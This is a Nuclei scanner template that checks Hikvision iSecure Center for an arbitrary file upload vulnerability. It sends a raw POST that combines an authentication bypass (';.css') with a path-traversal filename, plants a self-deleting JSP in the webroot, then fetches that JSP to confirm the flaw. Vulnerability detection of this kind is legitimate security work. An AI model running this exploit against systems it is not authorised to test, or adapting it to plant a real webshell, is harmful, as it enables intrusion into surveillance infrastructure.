id: hikvision-iSecure-Center-lm-api-files-fileupload
info:
  name: 海康威视iSecure Center综合安防管理平台lm任意文件上传
  author: leadlife
  severity: critical
  description: 
  reference:
    - 
  metadata:
    verified: true
    fofa-query:
  tags: hikvision,fileupload

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |-
        POST /lm/api/files;.css HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVBf7Cs8QWsfwC82M
        Content-Length: 347
        SL-CE-SUID: 39

        ------WebKitFormBoundaryVBf7Cs8QWsfwC82M
        Content-Disposition: form-data; name="file"; filename="../../../../../tomcat85linux64.1/webapps/els/static/{{filename}}.jsp"
        Content-Type: application/zip

        <% out.println("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundaryVBf7Cs8QWsfwC82M--

      - |+
        GET /els/static/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}


    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2, '{{randstr}}')
        condition: and
